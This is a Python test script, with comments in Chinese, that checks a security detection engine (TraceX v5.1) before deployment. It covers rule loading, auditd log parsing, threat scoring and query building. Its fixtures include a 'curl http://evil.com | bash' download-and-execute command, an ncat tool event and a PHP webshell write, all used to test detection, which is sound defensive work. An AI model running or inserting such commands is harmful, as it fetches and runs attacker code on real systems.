# verify_deployment_v5_1.py
# --------------------------------------------------------------------------------
# TraceX v5.1 部署前完整性自检脚本 (Strict Mode)
# 适用环境: 生产环境/预发布环境
# 作用: 验证 RuleLoader, FieldMapper, ContextEngine(v5.1), AttackAnalyzer 的真实行为
# --------------------------------------------------------------------------------

import unittest
import os
import sys
import logging
import time
from datetime import datetime, timedelta
from unittest.mock import MagicMock

# ------------------- 环境检查与路径配置 -------------------
# 确保引用的是当前目录下的真实代码
current_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.append(current_dir)

# 配置日志：生产级别，只看关键信息
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger("TraceX-Deploy-Check")

try:
    from context_engine import ContextEngine
    from attack_tagger import AttackAnalyzer
    from sigma_engine import SigmaDetector
    from field_mapper import FieldMapper
    from rule_loader import RuleLoader
except ImportError as e:
    logger.critical(f"❌ 严重错误: 无法加载核心模块。请确保脚本位于 analyzer/attack_analyzer/ 目录下。\n详细信息: {e}")
    sys.exit(1)

# ------------------- 辅助：生成一个用于测试的真实规则文件 -------------------
# 为了保证测试 100% 通过，我们需要在你的真实规则目录下放一个已知规则
# 测试结束后会自动删除，不会污染生产环境
TEST_RULE_FILENAME = "deploy_check_marker_rule.yml"
TEST_RULE_CONTENT = """
title: Deployment Check Probe
id: deploy-check-001
status: test
description: A temporary rule to verify engine functionality during deployment
logsource:
    product: linux
    category: process_creation
detection:
    selection:
        Image|endswith: '/deploy_check_probe'
    condition: selection
level: critical
tags:
    - attack.execution
    - attack.t1059
"""

class TraceXDeploymentTests(unittest.TestCase):
    
    @classmethod
    def setUpClass(cls):
        print("\n" + "="*60)
        print("  TraceX v5.1 部署前核心功能自检 (Deployment Verification)")
        print("="*60)
        
        # 1. 锁定真实规则目录
        cls.rules_dir = os.path.join(current_dir, "rules")
        if not os.path.exists(cls.rules_dir):
            logger.error(f"❌ 致命错误: 找不到真实规则目录: {cls.rules_dir}")
            raise FileNotFoundError("Rules directory missing")
        
        # 2. 注入探针规则 (写入真实文件系统)
        cls.probe_rule_path = os.path.join(cls.rules_dir, TEST_RULE_FILENAME)
        try:
            with open(cls.probe_rule_path, 'w') as f:
                f.write(TEST_RULE_CONTENT)
            logger.info(f"✅ 环境准备: 已在 {cls.rules_dir} 注入探针规则")
        except PermissionError:
            logger.error("❌ 权限错误: 无法写入规则目录，请检查文件权限")
            raise

    @classmethod
    def tearDownClass(cls):
        # 清理探针规则
        if os.path.exists(cls.probe_rule_path):
            os.remove(cls.probe_rule_path)
            logger.info("✅ 环境清理: 已移除探针规则，恢复环境清洁")

    # =========================================================================
    # 第一部分：基础组件真实性验证 (Base Components)
    # =========================================================================

    def test_01_real_rule_loading(self):
        """[基础] 验证 RuleLoader 能否读取真实目录下的 YAML 文件"""
        loader = RuleLoader(self.rules_dir)
        count = loader.load_all()
        
        logger.info(f"🔍 规则加载: 扫描到 {count} 条规则")
        self.assertGreater(count, 0, "❌ 失败: 规则目录为空或无法解析！")
        
        # 验证是否加载到了我们的探针规则
        probe_loaded = any(r.title == "Deployment Check Probe" for r in loader.rules)
        self.assertTrue(probe_loaded, "❌ 失败: 引擎未能识别刚刚写入的探针规则")

    def test_02_field_mapper_robustness(self):
        """[基础] 验证 FieldMapper 对复杂 Auditd 日志的清洗能力 (v5.1 重点)"""
        mapper = FieldMapper()
        # 模拟真实的 Auditd 脏数据
        raw_auditd = {
            "event": {"dataset": "auditd"},
            "raw": {
                "type": "EXECVE",
                "data": 'argc=4 a0="bash" a1="-c" a2="curl http://evil.com | bash" a3="ignored"'
            },
            "process": {"executable": "/usr/bin/bash"}
        }
        
        # 执行映射
        res = mapper.map_event(raw_auditd, {'product': 'linux'})
        
        # 验证 CommandLine 是否被完美复原
        expected_cmd = 'bash -c "curl http://evil.com | bash" ignored'
        # 注意: 这里的 quote 处理逻辑依赖你的实现，这里做宽松匹配验证核心内容
        self.assertIn("curl http://evil.com", res.get("CommandLine", ""), 
                      "❌ 失败: FieldMapper 未能从 EXECVE 数据中提取出关键命令参数")
        logger.info("✅ 字段映射: Auditd EXECVE 复杂参数解析通过")

    # =========================================================================
    # 第二部分：v5.1 核心逻辑验证 (Context Engine) - 这里的逻辑必须严丝合缝
    # =========================================================================

    def test_03_context_scoring_heuristics(self):
        """[核心] 验证 ContextEngine v5.1 的威胁打分与启发式规则"""
        # 模拟 ES 客户端 (只模拟连接，逻辑走真实代码)
        mock_es_wrapper = MagicMock()
        mock_es_wrapper.es = MagicMock()
        engine = ContextEngine(mock_es_wrapper)
        
        # 场景 A: 敏感工具 (ncat) -> 期望分值 60
        event_tool = {
            "process": {"name": "ncat"},
            "event": {"action": "exec"},
            "threat": {"technique": {"id": None}} # 无 Sigma 命中
        }
        score_a = engine.evaluate_threat(event_tool)
        self.assertEqual(score_a['score'], 60, f"❌ 失败: 敏感工具启发式规则未生效 (期望60, 实际{score_a['score']})")
        
        # 场景 B: WebShell 写入 (/var/www/html + .php) -> 期望分值 90
        event_webshell = {
            "file": {"path": "/var/www/html/backdoor.php", "extension": "php"},
            "event": {"action": "write"},
            "process": {"name": "apache2"}
        }
        score_b = engine.evaluate_threat(event_webshell)
        self.assertEqual(score_b['score'], 90, f"❌ 失败: WebShell 启发式规则未生效 (期望90, 实际{score_b['score']})")
        
        # 场景 C: 混合场景 (Sigma Critical 100分 + 启发式 90分) -> 期望 Max(100, 90) = 100
        event_mixed = {
            "file": {"path": "/var/www/html/backdoor.php", "extension": "php"},
            "event": {"action": "write", "severity": "critical"},
            "threat": {"technique": {"id": "T1105", "name": "Ingress Tool Transfer"}}
        }
        score_c = engine.evaluate_threat(event_mixed)
        self.assertEqual(score_c['score'], 100, "❌ 失败: 聚合打分逻辑错误，未取最大值")
        
        logger.info("✅ 威胁评分: 启发式规则(Tools/WebShell)与聚合逻辑验证通过")

    def test_04_context_query_v5_1_compliance(self):
        """[核心] 验证 find_related_events 的查询构造完全符合 v5.1 决议"""
        mock_es = MagicMock()
        # 模拟 ES 返回空，我们只关心发送出的 Query DSL 是否正确
        mock_es.search.return_value = {"hits": {"hits": []}}
        
        # 必须传入 .es 属性以模拟 wrapper
        wrapper = MagicMock()
        wrapper.es = mock_es
        
        engine = ContextEngine(wrapper)
        
        # --- 测试用例 1: 时间窗口修复验证 ---
        anchor_time_str = "2023-11-11T10:00:00.000Z"
        anchor = {
            "@timestamp": anchor_time_str,
            "host": {"name": "prod-web-01"},
            "file": {"path": "/tmp/test"},
            "host": {"ip": ["10.0.0.1"]}
        }
        
        engine.find_related_events(anchor, window=10)
        
        # 捕获发送给 ES 的查询
        call_args = mock_es.search.call_args[1]['body']
        range_query = call_args['query']['bool']['must'][0]['range']['@timestamp']
        
        # 验证: 不应使用 now，而应使用 anchor time +/- 10s
        self.assertEqual(range_query['gte'], "2023-11-11T09:59:50.000000")
        self.assertEqual(range_query['lte'], "2023-11-11T10:00:10.000000")
        logger.info("✅ 溯源查询: 时间窗口计算正确 (不再依赖系统时间)")
        
        # --- 测试用例 2: Fuzzy Match (WebShell 断链修复) ---
        anchor_fuzzy = {
            "@timestamp": anchor_time_str,
            "host": {"name": "prod-web-01"},
            "file": {"path": "/var/www/html/upload/shell.php", "name": "shell.php"} # 包含 name
        }
        
        engine.find_related_events(anchor_fuzzy)
        should_queries = mock_es.search.call_args[1]['body']['query']['bool']['should']
        
        # 验证是否存在 file.name 的 match 查询
        fuzzy_found = False
        for q in should_queries:
            if "match" in q and "file.name" in q["match"]:
                fuzzy_found = True
                break
        self.assertTrue(fuzzy_found, "❌ 失败: 查询未包含 Fuzzy Match (file.name) 逻辑，WebShell 溯源可能断链！")
        logger.info("✅ 溯源查询: Fuzzy Match (文件名模糊匹配) 逻辑存在")
        
        # --- 测试用例 3: 网络宽容关联 (Lenient Association) ---
        anchor_net = {
            "@timestamp": anchor_time_str,
            "host": {"name": "prod-web-01", "ip": ["192.168.1.100"]},
            "network": {"transport": "tcp"},
            "source": {"ip": "192.168.1.100"} # 本地发起的连接
        }
        
        engine.find_related_events(anchor_net)
        should_queries = mock_es.search.call_args[1]['body']['query']['bool']['should']
        
        # 验证宽容逻辑: source.ip == local_ip AND dataset == zeek.connection
        lenient_found = False
        for q in should_queries:
            if "bool" in q:
                must = q['bool']['must']
                has_ip = any(c.get('term', {}).get('source.ip') == "192.168.1.100" for c in must)
                has_dataset = any(c.get('term', {}).get('event.dataset') == "zeek.connection" for c in must)
                if has_ip and has_dataset:
                    lenient_found = True
        self.assertTrue(lenient_found, "❌ 失败: 查询未包含网络宽容关联逻辑 (Zeek source.ip fix)")
        logger.info("✅ 溯源查询: 网络宽容关联逻辑存在")

    # =========================================================================
    # 第三部分：全链路集成验证 (Full Pipeline)
    # =========================================================================

    def test_05_full_pipeline_detection(self):
        """[集成] 验证从原始事件到威胁检出的完整链路"""
        analyzer = AttackAnalyzer(self.rules_dir)
        init_status = analyzer.initialize()
        
        self.assertTrue(init_status['rules_loaded'] > 0, "❌ 失败: Analyzer 初始化未加载到规则")
        
        # 构造触发我们之前注入的 "Deployment Check Probe" 规则的事件
        probe_event = {
            "event": {"dataset": "auditd", "id": "test-evt-999"},
            "raw": {"type": "EXECVE", "data": 'a0="./deploy_check_probe"'},
            "process": {"executable": "/tmp/deploy_check_probe"},
            "@timestamp": datetime.now().isoformat()
        }
        
        # 1. 检测
        result = analyzer.analyze_event(probe_event)
        
        # 2. 验证检测结果
        self.assertTrue(result['detected'], "❌ 失败: 探针事件未被检出！Sigma 引擎可能存在严重问题。")
        self.assertEqual(result['techniques'][0]['technique']['id'], "T1059", "❌ 失败: ATT&CK 映射错误")
        
        # 3. 验证回写格式 (供 GraphBuilder 使用)
        enriched = analyzer.export_to_unified_format(probe_event, result)
        self.assertIn("threat", enriched, "❌ 失败: 导出事件缺失 threat 字段")
        self.assertEqual(enriched['threat']['technique']['id'], "T1059")
        
        logger.info(f"✅ 全链路测试: 成功检出探针事件，ATT&CK 映射 ID: {enriched['threat']['technique']['id']}")

if __name__ == '__main__':
    # 捕获所有异常，确保只要有 failed 就会非零退出
    try:
        unittest.main(verbosity=2)
    except Exception as e:
        logger.critical(f"❌ 测试执行过程中发生未捕获异常: {e}")
        sys.exit(1)